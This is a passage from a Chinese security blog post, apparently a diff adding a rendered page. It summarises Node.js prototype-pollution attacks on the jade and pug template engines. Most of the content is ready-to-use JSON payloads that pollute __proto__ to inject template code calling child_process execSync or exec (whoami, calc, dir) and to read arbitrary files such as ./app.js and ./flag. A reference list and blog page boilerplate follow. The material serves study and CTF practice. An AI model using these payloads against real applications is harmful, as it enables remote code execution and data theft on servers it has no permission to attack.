global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()//&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//调用链2</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;code&quot;</span>:&#123;<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString();&quot;</span>&#125;&#125;&#125;<br><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;code&quot;</span>:&#123;<span class="hljs-string">&quot;buffer&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;1)))\nreturn global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString();//&quot;</span>&#125;&#125;&#125;<br><br><span class="hljs-comment">//任意文件读污染链</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;1,\&quot;./app.js\&quot;))//&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;./app.js&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//调用链1，针对 jade RCE链的污染, 普通的模板可以只需要污染 self 和 line, 但是有继承的模板还需要污染 type</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Doctype&quot;</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;))\nreturn global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()//&quot;</span>&#125;&#125;&#125;<br><br><span class="hljs-comment">//其余示例</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;console.log(global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;))&quot;</span>&#125;&#125;<br><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Code&quot;</span>,<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);//&quot;</span>&#125;&#125;&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="配合-pug-模板引擎"><a href="#配合-pug-模板引擎" class="headerlink" title="配合 pug 模板引擎"></a>配合 pug 模板引擎</h3><p><strong>Jade</strong> 是pug最初的名称。由于商标问题，Jade 在 2016 年更名为 <strong>Pug</strong>。两者的语法几乎完全一样，Pug 只是 Jade 的后续版本。</p>
+<figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-comment">//任意文件读取</span><br>&#123;<br>    <span class="hljs-string">&quot;song.__proto__.name&quot;</span>:<span class="hljs-string">&quot;Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild&quot;</span>,<br>    <span class="hljs-string">&quot;&#123;&#125;.__proto__.self&quot;</span>:true,<br>    <span class="hljs-string">&quot;&#123;&#125;.__proto__.filename&quot;</span>:<span class="hljs-string">&quot;./flag&quot;</span><br>&#125;<br><span class="hljs-comment">//AST Injection</span><br>&#123;<br>    <span class="hljs-string">&quot;song.__proto__.name&quot;</span>:<span class="hljs-string">&quot;Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild&quot;</span>,<br>    <span class="hljs-string">&quot;&#123;&#125;.__proto__.block&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;Text&quot;</span>,<br>        <span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;process.mainModule.require(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&quot;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">//另一条链</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;</span>song.__proto__.name<span class="hljs-string">&quot;:&quot;</span>Not Polluting with the boys, ASTa la vista baby,The Galactic Rhymes, The Goose went wild<span class="hljs-string">&quot;,</span><br><span class="hljs-string">    &quot;</span>__proto__.code<span class="hljs-string">&quot;:&#123;</span><br><span class="hljs-string">        &quot;</span>val<span class="hljs-string">&quot;:&quot;</span>;process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<span class="hljs-string">&quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">//因为jade和pug很像像，所以在jade模板引擎里面有的链也可以打得通</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;</span>__proto__<span class="hljs-string">&quot;:&#123;</span><br><span class="hljs-string">        &quot;</span>self<span class="hljs-string">&quot;:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;,</span><br><span class="hljs-string">        &quot;</span>code<span class="hljs-string">&quot;:&#123;</span><br><span class="hljs-string">            &quot;</span>val<span class="hljs-string">&quot;:&quot;</span>;process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>);<span class="hljs-string">&quot;&#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000042725370">javascript - 彻底搞懂JS原型与原型链 - 个人文章 - SegmentFault 思否</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1#reply-list">深入理解 JavaScript Prototype 污染攻击 | 离别歌</a></p>
+<p><a target="_blank" rel="noopener" href="https://nodejs.org/api/modules.html#requireid">Modules: CommonJS modules | Node.js v24.3.0 Documentation</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9482">谭谈 Javascript 原型链与原型链污染-先知社区</a></p>
+<p>最好再看看后面几个：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248170#h2-0">从 Lodash 原型链污染到模板 RCE-安全KER - 安全资讯平台</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236354">关于nodejs的ejs和jade模板引擎的原型链污染挖掘-安全KER - 安全资讯平台</a></p>
+<p><a target="_blank" rel="noopener" href="https://h4cking2thegate.github.io/posts/39008/index.html">Nodejs原型链污染总结 | H4cking to the Gate</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246492">从一道题开始的pug原型污染链挖掘-安全KER - 安全资讯平台</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web/" class="category-chain-item">web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="print-no-link">#学习总结</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>node.js原型链污染学习总结</div>
+      <div>http://example.com/2025/07/13/node.js原型链污染学习总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/13/Buuoj_WP1/" title="buuoj WP1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">buuoj WP1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/13/SSTI-Lab/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
